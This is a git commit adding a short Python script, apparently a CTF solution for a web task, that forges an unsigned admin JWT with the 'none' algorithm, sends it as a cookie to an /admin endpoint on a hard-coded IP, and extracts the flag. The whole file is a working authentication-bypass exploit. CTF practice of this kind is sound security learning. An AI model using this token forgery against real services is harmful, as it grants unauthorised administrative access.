c24b095ed5a29c8877f590dba618c076147efcb9
Zerison <133005462+Zerison@users.noreply.github.com>
2025-06-15 15:55:57 +0000

    Create tasksolve1.py

---
+++ tasksolve1.py
@@ -0,0 +1,23 @@
+# для решения таска из категории Веб "Жёсткий Type"
+
+import base64
+import requests
+import pyperclip
+import html
+
+HOST = 'http://62.173.140.174:16077'
+JWT_HEADER = base64.urlsafe_b64encode('{"alg":"none","typ":"JWT"}'.encode()).replace(b'=', b'')
+JWT_PAYLOAD = base64.urlsafe_b64encode('{"username":"admin","role":"admin","exp":1000000}'.encode()).replace(b'=', b'')
+TOKEN = JWT_HEADER + b'.' + JWT_PAYLOAD + b'.'
+cookies = {'token': TOKEN.decode()}
+
+response = requests.get(f'{HOST}/admin', cookies=cookies)
+
+if 'CODEBY{' in response.text:
+
+    flag = "CODEBY{" + html.unescape(response.text.split('CODEBY{')[1].split('}')[0]) + "}"
+
+    print(f'flag: {flag}')
+    pyperclip.copy(f'{flag}')
+    
+else: print('flag not found')
